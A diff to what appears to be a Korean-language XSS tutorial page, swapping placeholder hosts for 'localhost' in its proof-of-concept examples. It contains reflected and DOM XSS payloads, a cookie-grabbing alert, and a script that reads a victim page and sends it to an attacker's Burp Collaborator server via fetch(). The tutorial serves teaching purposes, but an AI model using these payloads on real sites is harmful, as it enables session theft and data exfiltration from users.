@@ -28,7 +28,7 @@ XSS의 공격은 크게 3가지 유형으로 나뉩니다.
 > Proof of Concept
 > {: .label .label-blue }
 > ``` 
-> https://<website>?url=<script>alert("XSS")</script> 
+> localhost?url=<script>alert("XSS")</script> 
 >```
 
 - Victim이 해당 URL을 클릭하면, 서버에서 해당 악성 스크립트를 Victim의 브라우저로 **"반사 (Reflect)"** 해서 보냅니다.
@@ -47,7 +47,7 @@ XSS의 공격은 크게 3가지 유형으로 나뉩니다.
 > Proof of Concept
 > {: .label .label-blue }
 > ``` 
-> https://<website>/#javascript:alert("XSS") 
+> localhost/#javascript:alert("XSS") 
 >```
 
 - URL의 매개변수 값 등을 조작해 스크립트를 실행시킵니다.
@@ -72,7 +72,7 @@ XSS의 공격은 크게 3가지 유형으로 나뉩니다.
 > {: .label .label-blue }
 > 쿠키를 팝업창에 띄우기
 > ``` 
-> https://<website>?url=<script>alert(document.cookie)</script> 
+> localhost?url=<script>alert(document.cookie)</script> 
 >```
 
 {: .important-title }
@@ -80,7 +80,7 @@ XSS의 공격은 크게 3가지 유형으로 나뉩니다.
 > {: .label .label-blue }
 > 쿠키를 Burp Collaborator (Attacker 서버로 보낼때)
 > ``` 
-> https://<website>?url=[The script under] 
+> localhost?url=[The script under] 
 >```
 > **[The script under]**:
 >```js
@@ -89,7 +89,7 @@ XSS의 공격은 크게 3가지 유형으로 나뉩니다.
 >   var url = 'VICTIM URL'
 >   xhr.onreadystatechange = function() {
 >       if (xhr.readyState == XMLHttpRequest.DONE) {
->           fetch('https://BURPCOLLABORATOR/' + xhr.responseText)
+>           fetch('BURPCOLLABORATOR URL' + xhr.responseText)
 >       }
 >   }
 >   xhr.open('GET', url, true);
